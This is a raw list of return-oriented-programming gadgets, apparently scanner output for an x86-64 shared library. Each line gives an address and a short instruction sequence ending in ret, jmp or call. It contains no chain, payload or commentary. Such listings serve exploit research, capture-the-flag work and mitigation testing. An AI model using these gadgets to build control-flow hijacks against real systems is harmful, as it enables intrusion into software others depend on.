0x00002aaaaab0bbef : mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab0a8d5 : mov byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x00002aaaaabe303d : mov byte ptr [rax], bl ; movsx eax, bl ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab79b22 : mov byte ptr [rax], cl ; mov rax, rdi ; ret
0x00002aaaaab921ef : mov byte ptr [rax], dh ; add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x572
0x00002aaaaabfe728 : mov byte ptr [rbp + 0x31], 0xc0 ; mov rcx, r14 ; mov rdi, r13 ; call r12
0x00002aaaaac1eb8e : mov byte ptr [rbp + 0x48dd74d2], 0x63 ; ror dword ptr [rax + 1], -8 ; ret
0x00002aaaaac5c0f4 : mov byte ptr [rbp - 0x40370003], bh ; std ; dec dword ptr [rax] ; ret 0xfffd
0x00002aaaaabff4a4 : mov byte ptr [rbx - 0x11], dl ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabd2076 : mov byte ptr [rbx], 0 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac2d2a8 : mov byte ptr [rbx], 0 ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabfab62 : mov byte ptr [rbx], 0 ; ret
0x00002aaaaaad7f96 : mov byte ptr [rbx], cl ; and bh, byte ptr [rax - 0x52] ; sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
0x00002aaaaab6bbf4 : mov byte ptr [rcx + 0xf], 0x94 ; ret 0x8440
0x00002aaaaac3d0c3 : mov byte ptr [rcx + 2], dl ; ret
0x00002aaaaac3d0e2 : mov byte ptr [rcx + 4], dl ; ret
0x00002aaaaac3d123 : mov byte ptr [rcx + 8], dl ; ret
0x00002aaaaab72e83 : mov byte ptr [rcx + rax - 0x38], cl ; jmp rax
0x00002aaaaab00e46 : mov byte ptr [rcx + rax - 0x3f], cl ; jmp rcx
0x00002aaaaab7323b : mov byte ptr [rcx], 0 ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab73180 : mov byte ptr [rcx], 0 ; mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaab732ba : mov byte ptr [rcx], 0 ; pop rbx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab1d21a : mov byte ptr [rcx], 0x48 ; cmp esi, edx ; jne 0x48219 ; xor eax, eax ; ret
0x00002aaaaab0250c : mov byte ptr [rcx], 0x83 ; ret
0x00002aaaaabb8a11 : mov byte ptr [rcx], 0xf ; test dword ptr [rbx - 0xa000000], esi ; ret 0x7420
0x00002aaaaac6da05 : mov byte ptr [rcx], al ; add byte ptr [rsp + rsi*2 - 0xa], al ; jmp rsp
0x00002aaaaac7ae10 : mov byte ptr [rcx], al ; ret
0x00002aaaaac3d0a0 : mov byte ptr [rcx], dl ; ret
0x00002aaaaab7e19a : mov byte ptr [rdi + 0x10], ch ; ret
0x00002aaaaab7c73b : mov byte ptr [rdi + 0x10], cl ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7af5b : mov byte ptr [rdi + 0x10], cl ; ret
0x00002aaaaab7e1ab : mov byte ptr [rdi + 0x10], cl ; xor ch, ch ; mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7b8f8 : mov byte ptr [rdi + 0x10], dh ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7a288 : mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7e1b0 : mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7e1d2 : mov byte ptr [rdi + 0x12], ch ; ret
0x00002aaaaab7e1f0 : mov byte ptr [rdi + 0x13], ch ; ret
0x00002aaaaab7e210 : mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7b96e : mov byte ptr [rdi + 0x14], dh ; lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7a2de : mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7c7c1 : mov byte ptr [rdi + 0x14], dl ; lea rax, qword ptr [rdi + 0x15] ; ret
0x00002aaaaab7afb1 : mov byte ptr [rdi + 0x14], dl ; ret
0x00002aaaaab7e231 : mov byte ptr [rdi + 0x14], dl ; xor ch, ch ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab7e236 : mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab7e252 : mov byte ptr [rdi + 0x16], ch ; ret
0x00002aaaaab7e272 : mov byte ptr [rdi + 0x17], ch ; ret
0x00002aaaaab7e292 : mov byte ptr [rdi + 0x18], ch ; ret
0x00002aaaaab7c843 : mov byte ptr [rdi + 0x18], cl ; lea rax, qword ptr [rdi + 0x19] ; ret
0x00002aaaaab7b033 : mov byte ptr [rdi + 0x18], cl ; ret
0x00002aaaaab7e2b3 : mov byte ptr [rdi + 0x18], cl ; xor ch, ch ; mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7b9f0 : mov byte ptr [rdi + 0x18], dh ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7a360 : mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab7e2b8 : mov byte ptr [rdi + 0x19], ch ; ret
0x00002aaaaab7e2da : mov byte ptr [rdi + 0x1a], ch ; ret
0x00002aaaaab7e2f8 : mov byte ptr [rdi + 0x1b], ch ; ret
0x00002aaaaab7e318 : mov byte ptr [rdi + 0x1c], ch ; ret
0x00002aaaaab7e334 : mov byte ptr [rdi + 0x1d], ch ; ret
0x00002aaaaab7e354 : mov byte ptr [rdi + 0x1e], ch ; ret
0x00002aaaaab7e374 : mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaab7e394 : mov byte ptr [rdi + 0x20], ch ; ret
0x00002aaaaab7b135 : mov byte ptr [rdi + 0x20], cl ; ret
0x00002aaaaab7e3b5 : mov byte ptr [rdi + 0x20], cl ; xor ch, ch ; mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab7e3ba : mov byte ptr [rdi + 0x21], ch ; ret
0x00002aaaaab7e40a : mov byte ptr [rdi + 0x40], ch ; ret
0x00002aaaaab7e0e0 : mov byte ptr [rdi + 0xa], ch ; ret
0x00002aaaaab7e0fe : mov byte ptr [rdi + 0xb], ch ; ret
0x00002aaaaab7e11e : mov byte ptr [rdi + 0xc], ch ; ret
0x00002aaaaab7e140 : mov byte ptr [rdi + 0xd], ch ; ret
0x00002aaaaab7e160 : mov byte ptr [rdi + 0xe], ch ; ret
0x00002aaaaab7e180 : mov byte ptr [rdi + 0xf], ch ; ret
0x00002aaaaab7e016 : mov byte ptr [rdi + 1], ch ; ret
0x00002aaaaabf8022 : mov byte ptr [rdi + 1], dh ; ret
0x00002aaaaabf8021 : mov byte ptr [rdi + 1], sil ; ret
0x00002aaaaabf81f0 : mov byte ptr [rdi + 2], 0 ; jne 0x123248 ; mov eax, r8d ; ret
0x00002aaaaab72ec3 : mov byte ptr [rdi + 2], 0 ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab72e33 : mov byte ptr [rdi + 2], 0 ; mov rax, rdi ; ret
0x00002aaaaab7e028 : mov byte ptr [rdi + 2], ch ; ret
0x00002aaaaab7b7a6 : mov byte ptr [rdi + 2], dh ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaab7a1a6 : mov byte ptr [rdi + 2], dh ; ret
0x00002aaaaab72d84 : mov byte ptr [rdi + 2], dl ; add rdi, 3 ; mov rax, rdi ; ret
0x00002aaaaab7c5c9 : mov byte ptr [rdi + 2], dl ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab7ae79 : mov byte ptr [rdi + 2], dl ; ret
0x00002aaaaab7e039 : mov byte ptr [rdi + 2], dl ; xor ch, ch ; mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaab7e03e : mov byte ptr [rdi + 3], ch ; ret
0x00002aaaaab72ee2 : mov byte ptr [rdi + 4], 0 ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab72e52 : mov byte ptr [rdi + 4], 0 ; mov rax, rdi ; ret
0x00002aaaaab7e056 : mov byte ptr [rdi + 4], ch ; ret
0x00002aaaaab7b7c2 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab7a1c2 : mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7c5f7 : mov byte ptr [rdi + 4], dl ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaab7ae97 : mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7e067 : mov byte ptr [rdi + 4], dl ; xor ch, ch ; mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab7e06c : mov byte ptr [rdi + 5], ch ; ret
0x00002aaaaab72e69 : mov byte ptr [rdi + 6], 0 ; ret
0x00002aaaaab7e07e : mov byte ptr [rdi + 6], ch ; ret
0x00002aaaaac04752 : mov byte ptr [rdi + 7], al ; ret
0x00002aaaaab7e09c : mov byte ptr [rdi + 7], ch ; ret
0x00002aaaaab1f606 : mov byte ptr [rdi + 8], 0 ; mov qword ptr [rdi], rax ; mov rax, rdi ; ret
0x00002aaaaaba9d60 : mov byte ptr [rdi + 8], 0x15 ; mov eax, 1 ; ret
0x00002aaaaaba9d21 : mov byte ptr [rdi + 8], 0x16 ; mov eax, 1 ; ret
0x00002aaaaaba9d90 : mov byte ptr [rdi + 8], 0x19 ; mov eax, 1 ; ret
0x00002aaaaaba9db7 : mov byte ptr [rdi + 8], 0x1a ; mov eax, 2 ; ret
0x00002aaaaaba9e00 : mov byte ptr [rdi + 8], 0x1c ; mov eax, 2 ; ret
0x00002aaaaaba9ded : mov byte ptr [rdi + 8], 0x1e ; mov eax, 2 ; ret
0x00002aaaaaba9dd5 : mov byte ptr [rdi + 8], 1 ; mov byte ptr [rdi], al ; mov eax, 1 ; ret
0x00002aaaaaba9d50 : mov byte ptr [rdi + 8], 1 ; mov eax, 1 ; ret
0x00002aaaaaba9d30 : mov byte ptr [rdi + 8], 2 ; xor eax, eax ; ret
0x00002aaaaab7e0a8 : mov byte ptr [rdi + 8], ch ; ret
0x00002aaaaab7b813 : mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaab7a203 : mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7c649 : mov byte ptr [rdi + 8], dl ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab7aed9 : mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaab7e0b9 : mov byte ptr [rdi + 8], dl ; xor ch, ch ; mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaab7e0be : mov byte ptr [rdi + 9], ch ; ret
0x00002aaaaabf8206 : mov byte ptr [rdi + rdx], 0 ; ret
0x00002aaaaab72dc6 : mov byte ptr [rdi - 1], al ; mov dword ptr [rdi - 7], eax ; mov rax, rdi ; ret
0x00002aaaaac26f7b : mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaab72dc5 : mov byte ptr [rdi - 1], r8b ; mov dword ptr [rdi - 7], eax ; mov rax, rdi ; ret
0x00002aaaaab72e10 : mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x00002aaaaaba9d80 : mov byte ptr [rdi], 0x5b ; mov eax, 1 ; ret
0x00002aaaaaba9dd9 : mov byte ptr [rdi], al ; mov eax, 1 ; ret
0x00002aaaaab7e002 : mov byte ptr [rdi], ch ; ret
0x00002aaaaab74012 : mov byte ptr [rdi], cl ; ret
0x00002aaaaab72d61 : mov byte ptr [rdi], dh ; add rdi, 1 ; mov rax, rdi ; ret
0x00002aaaaab7b780 : mov byte ptr [rdi], dh ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaab7a180 : mov byte ptr [rdi], dh ; ret
0x00002aaaaab7c5a2 : mov byte ptr [rdi], dl ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab7ae52 : mov byte ptr [rdi], dl ; ret
0x00002aaaaab7e012 : mov byte ptr [rdi], dl ; xor ch, ch ; mov byte ptr [rdi + 1], ch ; ret
0x00002aaaaab72d60 : mov byte ptr [rdi], sil ; add rdi, 1 ; mov rax, rdi ; ret
0x00002aaaaab79caa : mov byte ptr [rdx + 0x10], ah ; mov rax, rdi ; ret
0x00002aaaaab76ed2 : mov byte ptr [rdx + 1], ah ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x00002aaaaac3f429 : mov byte ptr [rdx + 2], al ; lea rax, qword ptr [rdx + 2] ; ret
0x00002aaaaab76efe : mov byte ptr [rdx + 2], al ; mov rax, rdi ; ret
0x00002aaaaab76f12 : mov byte ptr [rdx + 4], ah ; mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x00002aaaaac3f457 : mov byte ptr [rdx + 4], al ; lea rax, qword ptr [rdx + 4] ; ret
0x00002aaaaab76f2c : mov byte ptr [rdx + 4], al ; mov rax, rdi ; ret
0x00002aaaaab79c40 : mov byte ptr [rdx + 8], ah ; mov rax, rdi ; ret
0x00002aaaaab76fb0 : mov byte ptr [rdx + 8], al ; mov rax, rdi ; ret
0x00002aaaaac461ab : mov byte ptr [rdx + rdx*8 + 0xac840f], 0 ; add dh, dh ; ret 0x7501
0x00002aaaaac5ed30 : mov byte ptr [rdx - 0xa], bh ; jmp qword ptr [rdx]
0x00002aaaaabf14e8 : mov byte ptr [rdx], 0 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabda241 : mov byte ptr [rdx], 0 ; pop rbx ; ret
0x00002aaaaab8d4fd : mov byte ptr [rdx], 0x83 ; ret 0x4102
0x00002aaaaac3f402 : mov byte ptr [rdx], al ; lea rax, qword ptr [rdx] ; ret
0x00002aaaaab76ed7 : mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x00002aaaaab44614 : mov byte ptr [rdx], al ; sti ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rdx*2 + 0x48], 0x89 ; ret
0x00002aaaaab463fa : mov byte ptr [rdx], bh ; movzx eax, dil ; ret
0x00002aaaaab4cf3a : mov byte ptr [rdx], bh ; ret
0x00002aaaaabd7a14 : mov byte ptr [rdx], cl ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r12 ; call rbx
0x00002aaaaab463f9 : mov byte ptr [rdx], dil ; movzx eax, dil ; ret
0x00002aaaaab4cf39 : mov byte ptr [rdx], dil ; ret
0x00002aaaaabd3743 : mov byte ptr [rip + 0x2c7987], cl ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaab01ae8 : mov byte ptr [rip + 0x397faf], dl ; ret
0x00002aaaaaad7478 : mov byte ptr [rip - 0x22beffe8], dh ; out 0xa9, al ; ret 0xbd07
0x00002aaaaac1c3e6 : mov byte ptr [rip - 0x7cb80000], 0xc2 ; adc byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00002aaaaabf854b : mov byte ptr [rsi + 3], bl ; pop rbx ; ret
0x00002aaaaabf854a : mov byte ptr [rsi + 3], r11b ; pop rbx ; ret
0x00002aaaaab69e04 : mov byte ptr [rsi + rdx + 1], al ; jg 0x94df7 ; ret
0x00002aaaaab69e01 : mov byte ptr [rsi + rdx], cl ; mov byte ptr [rsi + rdx + 1], al ; jg 0x94dfa ; ret
0x00002aaaaac7a848 : mov byte ptr [rsi - 0x12], cl ; jmp qword ptr [rdx]
0x00002aaaaab1f773 : mov byte ptr [rsi], al ; jne 0x4a757 ; mov rax, rsi ; ret
0x00002aaaaab1f6ef : mov byte ptr [rsi], dl ; jne 0x4a6df ; mov rax, rsi ; ret
0x00002aaaaabc8506 : mov byte ptr [rsp + 0x2f], dl ; mov qword ptr [rsp + 0x40], rax ; call 0x1f7fb
0x00002aaaaab96139 : mov byte ptr [rsp + 0x71], al ; jmp 0xbf371
0x00002aaaaab4a50f : mov ch, 0 ; add byte ptr [rax], al ; mov edx, eax ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab43537 : mov ch, 0 ; add byte ptr [rax], al ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaac57022 : mov ch, 0x31 ; mov ah, bl ; push rsi ; ret
0x00002aaaaac58363 : mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00002aaaaac5d7f0 : mov ch, 0x52 ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac596ff : mov ch, 0x99 ; in eax, -1 ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaabd41a7 : mov ch, 0x9f ; clc ; inc dword ptr [rbp - 0x7cee8b40] ; ret
0x00002aaaaac5a0aa : mov ch, 0xab ; ret
0x00002aaaaaad878f : mov ch, 0xb7 ; cli ; add ebx, ebp ; in al, -0x12 ; jne 0x377b ; ret 0x975
0x00002aaaaac86259 : mov ch, 0xf5 ; call rdi
0x00002aaaaac7bfa9 : mov ch, 0xfb ; call qword ptr [rax]
0x00002aaaaac694d1 : mov ch, 0xfd ; call rcx
0x00002aaaaac2e557 : mov ch, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac43796 : mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaabd257a : mov ch, byte ptr [rax + rax] ; lea rax, qword ptr [rip + 0x2c8a14] ; ret
0x00002aaaaabd2581 : mov ch, byte ptr [rax + rax] ; ret
0x00002aaaaabf3b43 : mov ch, byte ptr [rdx] ; add byte ptr [rax - 0x7d], cl ; ret 0xe801
0x00002aaaaab80380 : mov ch, dh ; and ch, 0xf ; je 0xab3ab ; add rax, 2 ; ret
0x00002aaaaac7b105 : mov cl, 0 ; add byte ptr [rax - 0x23], ch ; out dx, al ; jmp qword ptr [rsi]
0x00002aaaaab62f2b : mov cl, 0 ; add byte ptr [rax], al ; xor rax, rax ; ret
0x00002aaaaac6b9c5 : mov cl, 0 ; add byte ptr [rsp + rcx*4 - 0x13], ah ; jmp rsp
0x00002aaaaabdd9be : mov cl, 0x15 ; jl 0x108973 ; sub eax, dword ptr [rax] ; je 0x1089d1 ; pop rbp ; ret
0x00002aaaaaad8bac : mov cl, 0x22 ; xchg eax, ebp ; ret
0x00002aaaaabd4be7 : mov cl, 0x35 ; ret
0x00002aaaaab91df8 : mov cl, 0x35 ; ret 0x308c
0x00002aaaaaad7be9 : mov cl, 0x65 ; or cl, cl ; clc ; ret
0x00002aaaaab9bcfe : mov cl, 0x90 ; xor eax, eax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaabbeab3 : mov cl, 0x94 ; sub eax, 0x5a0a8900 ; pop rcx ; pop rbx ; ret
0x00002aaaaabe9963 : mov cl, 0xd ; fistp qword ptr [rip + 0x3948002b] ; ret 0x840f
0x00002aaaaac173f0 : mov cl, 0xe9 ; add esi, ebx ; movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaac7b019 : mov cl, 0xee ; call qword ptr [rax]
0x00002aaaaac2e9d7 : mov cl, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabaa909 : mov cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaab01852 : mov cl, byte ptr [rax + 0x39] ; ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x00002aaaaab660c5 : mov cl, byte ptr [rbx - 0x37d67dfc] ; ret
0x00002aaaaab72de3 : mov cl, byte ptr [rcx + 1] ; ret 0xff41
0x00002aaaaab5e1e4 : mov cl, byte ptr [rdi - 0x73] ; adc al, 0xa ; jmp r10
0x00002aaaaac594d2 : mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x00002aaaaab7af54 : mov cl, byte ptr [rsi + 0x10] ; movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], cl ; ret
0x00002aaaaac488a2 : mov cl, byte ptr [rsi + 0x25] ; add byte ptr [rbp - 0xcf98a40], al ; ret
0x00002aaaaab74010 : mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaac72969 : mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaac72999 : mov cl, ch ; jmp rsp
0x00002aaaaab8036b : mov cl, dl ; and cl, 0xf ; je 0xab397 ; ret
0x00002aaaaac5978c : mov cs, edi ; ret 0x8b36
0x00002aaaaac1f5ee : mov cs, word ptr [rip - 0x7cb80000] ; ret 0xe910
0x00002aaaaac2fca4 : mov cx, word ptr [rsi] ; mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x00002aaaaab7a1a0 : mov cx, word ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x00002aaaaac91b84 : mov dh, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 5
0x00002aaaaab4e784 : mov dh, 0 ; add rsp, 0x98 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4f60e : mov dh, 0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab502d6 : mov dh, 0 ; pop rbx ; ret
0x00002aaaaab4cf63 : mov dh, 0 ; ret
0x00002aaaaac2fd81 : mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x00002aaaaab63114 : mov dh, 0x16 ; sub eax, edx ; ret
0x00002aaaaab08bd0 : mov dh, 0x17 ; test dl, dl ; jne 0x33bb6 ; ret
0x00002aaaaabee14c : mov dh, 0x2a ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaab7316d : mov dh, 0x31 ; test sil, sil ; jne 0x9e16a ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaabb7eba : mov dh, 0x34 ; adc cl, byte ptr [rax - 0x7d] ; ret 0x4001
0x00002aaaaaafa944 : mov dh, 0x34 ; adc dword ptr [rax + 0x39], ecx ; ret 0x8840
0x00002aaaaab41206 : mov dh, 0x40 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x00002aaaaac02292 : mov dh, 0x40 ; or dh, dh ; ret 0x8802
0x00002aaaaababa96 : mov dh, 0x41 ; cmp eax, esi ; jge 0xd6a77 ; mov edx, eax ; jmp 0xd6a80
0x00002aaaaaba36b5 : mov dh, 0x42 ; add cl, byte ptr [rax - 0x7d] ; ret 0x8301
0x00002aaaaaba2fd9 : mov dh, 0x42 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaab41853 : mov dh, 0x42 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x00002aaaaab1b273 : mov dh, 0x43 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaab6dfd1 : mov dh, 0x45 ; ret
0x00002aaaaab71f09 : mov dh, 0x45 ; ret 0x8348
0x00002aaaaab6dfc2 : mov dh, 0x45 ; ret 0x8349
0x00002aaaaab20c83 : mov dh, 0x46 ; or al, 0x83 ; ret
0x00002aaaaac46241 : mov dh, 0x47 ; cmc ; movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00002aaaaac46231 : mov dh, 0x47 ; hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00002aaaaac46201 : mov dh, 0x47 ; int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x00002aaaaac46221 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x00002aaaaac46211 : mov dh, 0x47 ; movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x00002aaaaab1239b : mov dh, 0x48 ; add al, 0x8d ; push rcx ; rol byte ptr [rax - 0x6df0f506], 1 ; ret 0xb60f
0x00002aaaaab1235b : mov dh, 0x48 ; add cl, byte ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab1233b : mov dh, 0x48 ; add dword ptr [rbp - 0x57f2faf], ecx ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab123bb : mov dh, 0x48 ; add eax, 0x80d0518d ; cli ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab1237b : mov dh, 0x48 ; add ecx, dword ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaac010c1 : mov dh, 0x48 ; add esp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab12493 : mov dh, 0x48 ; or al, 0x8d ; push rcx ; rol byte ptr [rax - 0x6df0f506], 1 ; ret 0xb60f
0x00002aaaaab1241b : mov dh, 0x48 ; or byte ptr [rbp - 0x57f2faf], cl ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab1245b : mov dh, 0x48 ; or cl, byte ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab1243b : mov dh, 0x48 ; or dword ptr [rbp - 0x57f2faf], ecx ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab124af : mov dh, 0x48 ; or eax, 0x80d0518d ; cli ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab12477 : mov dh, 0x48 ; or ecx, dword ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaabb53ca : mov dh, 0x48 ; xor byte ptr [rax - 0x77], cl ; ret 0x8041
0x00002aaaaabb540c : mov dh, 0x48 ; xor byte ptr [rcx - 0x80], al ; stc ; adc dword ptr [rsi + rsi + 0x48], esi ; mov edx, eax ; jmp 0xe03ba
0x00002aaaaaafac59 : mov dh, 0x4a ; dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaaba5d41 : mov dh, 0x4b ; add ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaac584c2 : mov dh, 0x4e ; ret 0x474c
0x00002aaaaabe2273 : mov dh, 0x4f ; add dword ptr [rcx - 0x7d], ecx ; ret 0x8408
0x00002aaaaabf830d : mov dh, 0x52 ; add dword ptr [rcx - 0x7d], ecx ; ret 0x4102
0x00002aaaaab41e29 : mov dh, 0x53 ; or al, 0xf6 ; ret 0xf04
0x00002aaaaaba8a1b : mov dh, 0x55 ; add byte ptr [rcx], bh ; ret 0x840f
0x00002aaaaab6d9b7 : mov dh, 0x55 ; ret
0x00002aaaaab6ffc5 : mov dh, 0x55 ; ret 0x8348
0x00002aaaaab6d9a9 : mov dh, 0x55 ; ret 0x8349
0x00002aaaaac46245 : mov dh, 0x56 ; cmc ; sub eax, edx ; ret
0x00002aaaaac46235 : mov dh, 0x56 ; hlt ; sub eax, edx ; ret
0x00002aaaaac46205 : mov dh, 0x56 ; int1 ; sub eax, edx ; ret
0x00002aaaaab2b807 : mov dh, 0x56 ; or al, 0x83 ; ret
0x00002aaaaab2b78a : mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x00002aaaaac46215 : mov dh, 0x56 ; sub eax, edx ; ret
0x00002aaaaac69bbc : mov dh, 0x5d ; cld ; inc dword ptr [rsi + 0x5d] ; cld ; call rsi
0x00002aaaaab3359e : mov dh, 0x75 ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabc0531 : mov dh, 0x75 ; add dh, dh ; ret 0x4002
0x00002aaaaabb5e95 : mov dh, 0x78 ; or byte ptr [rcx + 0x63], cl ; cmp al, 0xbb ; add rdi, r11 ; jmp rdi
0x00002aaaaac6a0a8 : mov dh, 0x85 ; cld ; inc dword ptr [rsi - 0x7b] ; cld ; call rsi
0x00002aaaaac6a5a0 : mov dh, 0xac ; cld ; inc dword ptr [rsi - 0x54] ; cld ; call rsi
0x00002aaaaab5d7d5 : mov dh, 0xc ; adc dword ptr [rax - 0x7d], ecx ; ret 0x8801
0x00002aaaaac02b0e : mov dh, 0xc0 ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac02aa8 : mov dh, 0xc0 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0fc5c : mov dh, 0xc0 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0262d : mov dh, 0xc0 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabbedff : mov dh, 0xc0 ; cmova eax, edx ; ret
0x00002aaaaab8f636 : mov dh, 0xc0 ; lea eax, dword ptr [rax + rax - 1] ; ret
0x00002aaaaaba2007 : mov dh, 0xc0 ; lea rax, qword ptr [rax + rax - 1] ; ret
0x00002aaaaab0a22d : mov dh, 0xc0 ; mov dword ptr [rbx + 0x40], eax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaaba83ff : mov dh, 0xc0 ; movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x00002aaaaab9533b : mov dh, 0xc0 ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab411d0 : mov dh, 0xc0 ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00002aaaaab412ff : mov dh, 0xc0 ; movsxd rax, dword ptr [rsi + rax*4] ; add rsi, rax ; jmp rsi
